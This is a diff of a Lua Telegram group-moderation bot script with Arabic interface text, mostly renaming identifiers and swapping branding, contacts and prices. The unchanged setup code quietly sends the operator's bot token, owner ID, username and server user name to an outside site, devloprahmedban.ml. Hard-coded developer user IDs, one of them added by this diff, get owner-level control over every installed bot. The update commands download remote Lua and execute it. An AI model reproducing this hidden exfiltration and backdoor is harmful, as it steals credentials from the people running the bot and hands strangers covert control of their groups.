@@ -36,7 +36,7 @@ end
 else
 print('\27[0;35m☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
-os.execute('lua hima .lua')
+os.execute('lua HiMA.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n\27[0;33;49m')
@@ -56,7 +56,7 @@ database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
-os.execute('lua hima .lua')
+os.execute('lua HiMA.lua')
 end
 local create_config_auto = function()
 config = {
@@ -75,10 +75,10 @@ UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 https.request('https://devloprahmedban.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
-file = io.open("hima ", "w")  
+file = io.open("HiMA", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/hima 
+cd $HOME/HiMA
 token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
@@ -98,18 +98,18 @@ echo -e "\033[38;5;208m"
 echo -e "                                                  "
 echo -e "\033[0;00m"
 echo -e "\e[36m"
-./tg -s ./hima .lua -p PROFILE --bot=$token
+./tg -s ./HiMA.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
 file = io.open("BAN", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/hima 
+cd $HOME/HiMA
 while(true) do
 rm -fr ../.telegram-cli
-screen -S hima  -X kill
-screen -S hima  ./hima 
+screen -S HiMA -X kill
+screen -S HiMA ./HiMA
 done
 ]])  
 file:close() 
@@ -150,7 +150,7 @@ print([[
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
                                                   
 
-> CH › 「SO_ALSIYAD 」
+> CH › 「@SO_ALSIYAD」
 ~> DEVELOPER › @H1_MA 
 ]])
 sudos = dofile("./kkkklInfo.lua") 
@@ -177,15 +177,15 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,859213488 ,859213488 ,859213488 }   
+sudo_users = {SUDO,859213488,859213488,1791666758}   
 function SudoBot(msg)  
-local hima  = false  
+local HiMA = false  
 for k,v in pairs(sudo_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
-hima  = true  
+HiMA = true  
 end  
 end  
-return hima   
+return HiMA  
 end 
 function DevSoFi(msg) 
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
@@ -299,11 +299,11 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(859213488 ) then  
+if tonumber(user_id) == tonumber(859213488) then  
 var = true 
-elseif tonumber(user_id) == tonumber(859213488 ) then
+elseif tonumber(user_id) == tonumber(1791666758) then
 var = true  
-elseif tonumber(user_id) == tonumber(859213488 ) then
+elseif tonumber(user_id) == tonumber(859213488) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -341,11 +341,11 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(859213488 ) then  
-var = 'المبرمج هيما '
-elseif tonumber(user_id) == tonumber(859213488 ) then
+if tonumber(user_id) == tonumber(859213488) then  
+var = 'المبرمج هيما'
+elseif tonumber(user_id) == tonumber(1791666758) then
 var = 'مالك السورس'
-elseif tonumber(user_id) == tonumber(859213488 ) then
+elseif tonumber(user_id) == tonumber(859213488) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -562,35 +562,35 @@ end
 end,nil)   
 end 
 function Total_Msg(msgs)  
-local hima _Msg = ''  
+local HiMA_Msg = ''  
 if msgs < 100 then 
-hima _Msg = 'غير متفاعل' 
+HiMA_Msg = 'غير متفاعل' 
 elseif msgs < 200 then 
-hima _Msg = 'بده يتحسن' 
+HiMA_Msg = 'بده يتحسن' 
 elseif msgs < 400 then 
-hima _Msg = 'شبه متفاعل' 
+HiMA_Msg = 'شبه متفاعل' 
 elseif msgs < 700 then 
-hima _Msg = 'متفاعل' 
+HiMA_Msg = 'متفاعل' 
 elseif msgs < 1200 then 
-hima _Msg = 'متفاعل قوي' 
+HiMA_Msg = 'متفاعل قوي' 
 elseif msgs < 2000 then 
-hima _Msg = 'متفاعل جدا' 
+HiMA_Msg = 'متفاعل جدا' 
 elseif msgs < 3500 then 
-hima _Msg = 'اقوى تفاعل'  
+HiMA_Msg = 'اقوى تفاعل'  
 elseif msgs < 4000 then 
-hima _Msg = 'متفاعل نار' 
+HiMA_Msg = 'متفاعل نار' 
 elseif msgs < 4500 then 
-hima _Msg = 'قمة التفاعل'
+HiMA_Msg = 'قمة التفاعل'
 elseif msgs < 5500 then 
-hima _Msg = 'اقوى متفاعل' 
+HiMA_Msg = 'اقوى متفاعل' 
 elseif msgs < 7000 then 
-hima _Msg = 'ملك التفاعل' 
+HiMA_Msg = 'ملك التفاعل' 
 elseif msgs < 9500 then 
-hima _Msg = 'امبروطور التفاعل' 
+HiMA_Msg = 'امبروطور التفاعل' 
 elseif msgs < 10000000000 then 
-hima _Msg = 'رب التفاعل'  
+HiMA_Msg = 'رب التفاعل'  
 end 
-return hima _Msg 
+return HiMA_Msg 
 end
 function Get_Info(msg,chat,user) 
 local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
@@ -645,16 +645,16 @@ function GetFile_Bot(msg)
 local list = database:smembers(bot_id..'Chek:Groups') 
 local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
 for k,v in pairs(list) do   
-NAME = 'hima  Chat'
+NAME = 'HiMA Chat'
 link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
 ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
 MNSH = database:smembers(bot_id..'Constructor'..v)
 MDER = database:smembers(bot_id..'Manager'..v)
 MOD = database:smembers(bot_id..'Mod:User'..v)
 if k == 1 then
-t = t..'"'..v..'":{"hima ":"'..NAME..'",'
+t = t..'"'..v..'":{"HiMA":"'..NAME..'",'
 else
-t = t..',"'..v..'":{"hima ":"'..NAME..'",'
+t = t..',"'..v..'":{"HiMA":"'..NAME..'",'
 end
 if #ASAS ~= 0 then 
 t = t..'"ASAS":['
@@ -863,19 +863,19 @@ return false
 end
 end,nil)   
 end  
-function plugin_hima (msg)
+function plugin_HiMA(msg)
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
 plugin = dofile("File_Bot/"..v)
-if plugin.hima  and msg then
-pre_msg = plugin.hima (msg)
+if plugin.HiMA and msg then
+pre_msg = plugin.HiMA(msg)
 end
 end
 end
 send(msg.chat_id_, msg.id_,pre_msg)  
 end
 --------------------------------------------------------------------------------------------------------------
-function Sourcehima (msg,data) -- بداية العمل
+function SourceHiMA(msg,data) -- بداية العمل
 if msg then
 local text = msg.content_.text_
 --------------------------------------------------------------------------------------------------------------
@@ -928,7 +928,7 @@ send(msg.chat_id_, msg.id_," ⦁ تمت الاذاعه الى *~ "..#list.." ~* 
 database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end
-------by-hima --
+------by-HiMA--
 if Chat_Type == 'UserBot' then
 if text == 'ukkk' and Dev(msg) then
 if not DevSoFi(msg) then 
@@ -945,7 +945,7 @@ end
 
 end
 end
-------by-hima --
+------by-HiMA--
 if Chat_Type == 'UserBot' then
 if not DevSoFi(msg) then
 if text == '/start' or text == 'العوده✨'  then  
@@ -961,11 +961,11 @@ send_inline_key(msg.chat_id_,bl,keyboard)
 end
 if text == "/start" then
 if not DevSoFi(msg) then
-local Namebot = (database:get(bot_id..'Name:Bot') or 'الصياد ') 
-local hima _Msg = { 
+local Namebot = (database:get(bot_id..'Name:Bot') or 'سون') 
+local HiMA_Msg = { 
 '  🤖╿آهلا انآ بــــوت آســمـي  '..Namebot..' ⛓│آختـصاصـي حمايـه آلمجـموعـات ..🥺\n🛡│ مـن آلسـبآم وآلتوجيه وآلتكرآر وآلخ..\n🚸╽ لتفعيل آلبوت آتبــع الشـروط 😈❕\n↫ ❬اضف البوت الى المجموعه❭\n↫ ❬ارفع البوت ادمن في المجموعه❭\n↫ ❬وارسل تفعيل وسيتم تفعيل البوت ورفع مشرفي الكروب تلقائين ❭',
 } 
-Namebot = hima _Msg[math.random(#hima _Msg)] 
+Namebot = HiMA_Msg[math.random(#HiMA_Msg)] 
 local msg_id = msg.id_/2097152/0.5  
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -973,7 +973,7 @@ keyboard.inline_keyboard = {
 {text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
 },
 {
-{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local function getpro(extra, result, success) 
@@ -990,14 +990,14 @@ end
 if text == "اسعارالتنصيب" then
 if not DevSoFi(msg) then
 local Text = [[
-┌ سعر التنصيب علي سورس الصياد 
+┌ سعر التنصيب علي سورس سون
 ├ سعر التنصيب العادي 25ح
 └ تواصل مع المطورين لتنصيب
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '˹༄𝐷𝑒𝑣 𝙼𝙾𝙷𝙰𝙼𝙴𝙳˼',url="t.me/H1_MA"},{text = '『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』˼', url="t.me/H1_MA"}},
-{{text = '˹ᴛᴏ➧ᴀѕᴋ˼',url="t.me/TW_MOHAMED_BOT"}}, 
+{{text = '˹ᴏѕᴏѕ ᴏғғʟɪɴᴇ˼',url="t.me/OSDDR"},{text = '˹ᴛᴀʜᴀ➧ᴏғғʟɪɴᴇ˼', url="t.me/Xxx_ksomk_xxX"}},
+{{text = '˹ᴛᴏ➧ᴀѕᴋ˼',url="t.me/TWASOLSOON"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1006,15 +1006,15 @@ end
 if text == "اسعار السورسات باكمل الحقوق" then
 if not DevSoFi(msg) then
 local Text = [[
-┌ سعر السورس عند هيما 
+┌ سعر السورس عند هيما
 ├ السورسات بتبدا مت100لي 240ج
 ├ سعر المصنع200
 └ سعر السيرفر ،100,و 4 بي120, 8بي160
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '˹الــمــبــرمــج هيماا˼', url="t.me/H1_MA"}},
-{{text = '˹تــواصــل هيماا˼',url="t.me/TW_MOHAMED_BOT"}}, 
+{{text = '˹الــمــبــرمــج بــانــدا˼', url="t.me/QSban"}},
+{{text = '˹تــواصــل بــانــدا˼',url="t.me/offline1E"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1133,8 +1133,8 @@ end
 tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
 tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
 if ta.code_ == 400 or ta.code_ == 5 then
-local hima _Msg = '\n ⦁قام الشخص بحظر البوت'
-send(msg.chat_id_, msg.id_,hima _Msg) 
+local HiMA_Msg = '\n ⦁قام الشخص بحظر البوت'
+send(msg.chat_id_, msg.id_,HiMA_Msg) 
 return false  
 end 
 if text then    
@@ -1258,10 +1258,10 @@ echo '☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n ⦁「 م
 ]]):read('*all'))  
 end
 if text == 'تحديث السورس ' and DevSoFi(msg) then 
-os.execute('rm -rf hima .lua')
-os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/hima .lua')
+os.execute('rm -rf HiMA.lua')
+os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/HiMA.lua')
 send(msg.chat_id_, msg.id_,' ⦁ تم تحديث السورس')
-dofile('hima .lua')  
+dofile('HiMA.lua')  
 end
 if text == 'جلب المشتركين' and DevSoFi(msg) then 
 local list = database:smembers(bot_id..'User_Bot') 
@@ -1298,7 +1298,7 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
 end
 if text == '/start' and DevSoFi(msg) then 
-local Text = '●انت الان المطور الاساسي في البوت \n● سورس الصياد \n ●يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/SO_ALSIYAD)'
+local Text = '●انت الان المطور الاساسي في البوت \n● سورس سون\n ●يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/SO_ALSIYAD)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
@@ -1379,7 +1379,7 @@ keyboard.inline_keyboard = {
 {text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
 },
 {
-{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -1427,7 +1427,7 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 if text == 'الاصدار' and DevSoFi(msg) then 
 database:del(bot_id..'Srt:Bot') 
-send(msg.chat_id_, msg.id_,' ⦁ اصدار سورس الصياد { S:12✓}')
+send(msg.chat_id_, msg.id_,' ⦁ اصدار سورس سون{ S:12✓}')
 end
 if text == '⇣•-•-•-•⟮قـناه الـبرمجه⟯•-•-•-•⇣' then
 local Text = [[ 
@@ -1443,22 +1443,22 @@ https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. ms
 end
 if text == '• ━━━━━━❪الركن الاخير❫━━━━━━ •' and DevSoFi(msg) then
 local Text = [[ 
-[قناه سورس الصياد ادخل وتابع الجديد](t.me/SO_ALSIYAD)
+[قناه سورس سون ادخل وتابع الجديد](t.me/SO_ALSIYAD)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹🅢🅘🅨🅐🅓', url="t.me/SO_ALSIYAD"}}, 
+{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ˼', url="t.me/SO_ALSIYAD"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qtdao/24&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == '• ━━━━━━❪الاقسام❫━━━━━━ •' and DevSoFi(msg) then
 local Text = [[ 
-[قناه سورس الصياد ادخل وتابع الجديد](t.me/SO_ALSIYAD)
+[قناه سورس سون ادخل وتابع الجديد](t.me/SO_ALSIYAD)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹🅢🅘🅨🅐🅓', url="t.me/SO_ALSIYAD"}}, 
+{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ˼', url="t.me/SO_ALSIYAD"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qtdao/24&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1502,15 +1502,15 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
 send(msg.chat_id_, msg.id_,' ') 
 end
-if text == 'هيما  مبرمج السورس' and DevSoFi(msg) then
+if text == 'هيما مبرمج السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-「المبرمج هيما  لو حابب تتواصل معاه
+「المبرمج هيما لو حابب تتواصل معاه
 اتبع الزر إلى تحت ↓」
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹༄𝐷𝑒𝑣 𝙼𝙾𝙷𝙰𝙼𝙴𝙳˼', url="t.me/H1_MA"}}, 
+{{text = '˹𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎˼', url="t.me/H1_MA"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1518,14 +1518,14 @@ end
 if text == 'قناه السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
- ⦁ من أحسن السورسات على التليجرام سورس الصياد  ⦁
+ ⦁ من أحسن السورسات على التليجرام سورس سون ⦁
 بجد سورس أمان جدا وفي مميزات جامده
 تع نصب بوتك عندنا لو محظور
 خش على تواصل هيدخلك لروم التواصل 
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹✰ SＯＵＲＣＥ✰˼', url="t.me/SO_ALSIYAD"}}, 
+{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ˼', url="t.me/SO_ALSIYAD"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qtdao/24&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1721,19 +1721,19 @@ if #group == i then
 if (w + q) == 0 then
 send(msg.chat_id_, msg.id_,' ⦁ لا يوجد جروبات وهميه في البوت\n')   
 else
-local hima  = (w + q)
-local sendok = #group - hima 
+local HiMA = (w + q)
+local sendok = #group - HiMA
 if q == 0 then
-hima  = ''
+HiMA = ''
 else
-hima  = '\n ⦁ تم ازالة  ↚ 「 '..q..' 」 جروبات من البوت'
+HiMA = '\n ⦁ تم ازالة  ↚ 「 '..q..' 」 جروبات من البوت'
 end
 if w == 0 then
-hima k = ''
+HiMAk = ''
 else
-hima k = '\n ⦁ تم ازالة  ↚ 「 '..w..' 」 كروب لان البوت عضو'
+HiMAk = '\n ⦁ تم ازالة  ↚ 「 '..w..' 」 كروب لان البوت عضو'
 end
-send(msg.chat_id_, msg.id_,' ⦁  عدد الجروبات الان  ↚ 「 '..#group..' 」'..hima k..''..hima ..'\n ⦁  الان عدد الجروبات الحقيقي  ↚ 「 '..sendok..' 」 جروبات\n')   
+send(msg.chat_id_, msg.id_,' ⦁  عدد الجروبات الان  ↚ 「 '..#group..' 」'..HiMAk..''..HiMA..'\n ⦁  الان عدد الجروبات الحقيقي  ↚ 「 '..sendok..' 」 جروبات\n')   
 end
 end
 end,nil)
@@ -1848,10 +1848,10 @@ end
 end
 --------------------------------------------------------------------------------------------------------------
 if text and not Special(msg) then  
-local hima 1_Msg = database:get(bot_id.."hima 1:Add:Filter:Rp2"..text..msg.chat_id_)   
-if hima 1_Msg then 
+local HiMA1_Msg = database:get(bot_id.."HiMA1:Add:Filter:Rp2"..text..msg.chat_id_)   
+if HiMA1_Msg then 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,' ⦁ الـعـضو   ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n ⦁ '..hima 1_Msg)
+send(msg.chat_id_, msg.id_,' ⦁ الـعـضو   ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n ⦁ '..HiMA1_Msg)
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
 return false
 end,nil)
@@ -2037,7 +2037,7 @@ end
 if msg.content_.ID == "MessageChatAddMembers" then 
 if msg.content_.members_[0].id_ == tonumber(bot_id) then 
 print("it is Bot")
-N = (database:get(bot_id.."Name:Bot") or "الصياد ")
+N = (database:get(bot_id.."Name:Bot") or "سون")
 tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
 tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = bot_id,offset_ = 0,limit_ = 1},function(extra,result,success) 
 if result.photos_[0] then
@@ -2121,14 +2121,14 @@ return false
 end
 end 
 --------------------------------------------------------------------------------------------------------------
-if hima _Msg and not Special(msg) then  
-local hima _Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
-if hima _Msg then    
+if HiMA_Msg and not Special(msg) then  
+local HiMA_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
+if HiMA_Msg then    
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⦁ ["..hima _Msg.."] \n")
+send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⦁ ["..HiMA_Msg.."] \n")
 else
-send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/SO_ALSIYAD)}\n ⦁ ["..hima _Msg.."] \n")
+send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/SO_ALSIYAD)}\n ⦁ ["..HiMA_Msg.."] \n")
 end
 end,nil)   
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
@@ -2936,10 +2936,10 @@ send(msg.chat_id_, msg.id_,' ⦁ لا تستطيع استخدام البوت \n 
 end
 return false
 end
-os.execute('rm -rf hima .lua')
-os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/hima .lua')
+os.execute('rm -rf HiMA.lua')
+os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/HiMA.lua')
 send(msg.chat_id_, msg.id_,' ⦁ تم تحديث السورس')
-dofile('hima .lua')  
+dofile('HiMA.lua')  
 end
 
 if text and text:match("^تغير الاشتراك$") and DevSoFi(msg) then  
@@ -3010,22 +3010,22 @@ if database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 if text and text:match("^كتم اسم (.*)$") and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 local BlNe = text:match("^كتم اسم (.*)$")
 send(msg.chat_id_, msg.id_, ' ⦁ تم كتم الاسم '..BlNe)
-database:sadd(bot_id.."hima :blocname"..msg.chat_id_, BlNe)
+database:sadd(bot_id.."HiMA:blocname"..msg.chat_id_, BlNe)
 end
 
 if text and text:match("^الغاء كتم اسم (.*)$") and Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 local delBn = text:match("^الغاء كتم اسم (.*)$")
 send(msg.chat_id_, msg.id_, ' ⦁ تم الغاء كتم الاسم '..delBn)
-database:srem(bot_id.."hima :blocname"..msg.chat_id_, delBn)
+database:srem(bot_id.."HiMA:blocname"..msg.chat_id_, delBn)
 end
 
 if text == "مسح الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
-database:del(bot_id.."hima :blocname"..msg.chat_id_)
+database:del(bot_id.."HiMA:blocname"..msg.chat_id_)
 texts = " ⦁ تم مسح الاسماء المكتومه "
 send(msg.chat_id_, msg.id_, texts)
 end
 if text == "الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
-local All_name = database:smembers(bot_id.."hima :blocname"..msg.chat_id_)
+local All_name = database:smembers(bot_id.."HiMA:blocname"..msg.chat_id_)
 t = "\n ⦁ قائمة الاسماء المكتومه \n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩ \n"
 for k,v in pairs(All_name) do
 t = t..""..k.."- (["..v.."])\n"
@@ -3049,7 +3049,7 @@ function S00F4_name(t1,t2)
 if t2.id_ then 
 name_MRSOFI = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
 if name_MRSOFI then 
-names_MRSOFI = database:smembers(bot_id.."hima :blocname"..msg.chat_id_) or ""
+names_MRSOFI = database:smembers(bot_id.."HiMA:blocname"..msg.chat_id_) or ""
 if names_MRSOFI and names_MRSOFI[1] then 
 for i=1,#names_MRSOFI do 
 if name_MRSOFI:match("(.*)("..names_MRSOFI[i]..")(.*)") then 
@@ -3066,16 +3066,16 @@ if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
 if text and text:match("^وضع توحيد (.*)$") and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
 local teh = text:match("^وضع توحيد (.*)$")
 send(msg.chat_id_, msg.id_,' ⦁ تم تعيين '..teh..' كتوحيد للمجموعه')
-database:set(bot_id.."hima :teh"..msg.chat_id_,teh)
+database:set(bot_id.."HiMA:teh"..msg.chat_id_,teh)
 end
 if text and text:match("^تعين عدد الكتم (.*)$") and Manager(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
 local nump = text:match("^تعين عدد الكتم (.*)$")
 send(msg.chat_id_, msg.id_,' ⦁ تم تعين  '..nump..' عدد الكتم')
-database:set(bot_id.."hima :nump"..msg.chat_id_,nump)
+database:set(bot_id.."HiMA:nump"..msg.chat_id_,nump)
 end
 if text == "التوحيد" then
-local s1 = database:get(bot_id.."hima :teh"..msg.chat_id_) or "لا يوجد توحيد"
-local s2 = database:get(bot_id.."hima :nump"..msg.chat_id_) or 5
+local s1 = database:get(bot_id.."HiMA:teh"..msg.chat_id_) or "لا يوجد توحيد"
+local s2 = database:get(bot_id.."HiMA:nump"..msg.chat_id_) or 5
 send(msg.chat_id_, msg.id_,' ⦁ التوحيد '..s1..'\n ⦁ عدد الكتم  : '..s2)
 end
 end
@@ -3088,20 +3088,20 @@ send(msg.chat_id_, msg.id_, ' ⦁ تم تعطيل التوحيد')
 database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
 end
 if not Constructor(msg) then
-if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."hima :teh"..msg.chat_id_) then 
+if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."HiMA:teh"..msg.chat_id_) then 
 id = msg.sender_user_id_
 function sofi_mrsofi_new(mrsofi1,mrsofi2)
 if mrsofi2 and mrsofi2.first_name_ then 
-if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."hima :teh"..msg.chat_id_).."(.*)") then 
-database:srem(bot_id.."hima :Muted:User"..msg.chat_id_, msg.sender_user_id_)
+if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."HiMA:teh"..msg.chat_id_).."(.*)") then 
+database:srem(bot_id.."HiMA:Muted:User"..msg.chat_id_, msg.sender_user_id_)
 else
-local mrsofi_nnn = database:get(bot_id.."hima :nump"..msg.chat_id_) or 5
-local mrsofi_nnn2 = database:get(bot_id.."hima :nump22"..msg.chat_id_..msg.sender_user_id_) or 0
+local mrsofi_nnn = database:get(bot_id.."HiMA:nump"..msg.chat_id_) or 5
+local mrsofi_nnn2 = database:get(bot_id.."HiMA:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
 if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
 database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
 else 
-database:incrby(bot_id.."hima :nump22"..msg.chat_id_..msg.sender_user_id_,1)
-send(msg.chat_id_, msg.id_, " ⦁ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "SO_ALSIYAD")..")\n ⦁ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."hima :teh"..msg.chat_id_).."} بجانب اسمك\n ⦁ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
+database:incrby(bot_id.."HiMA:nump22"..msg.chat_id_..msg.sender_user_id_,1)
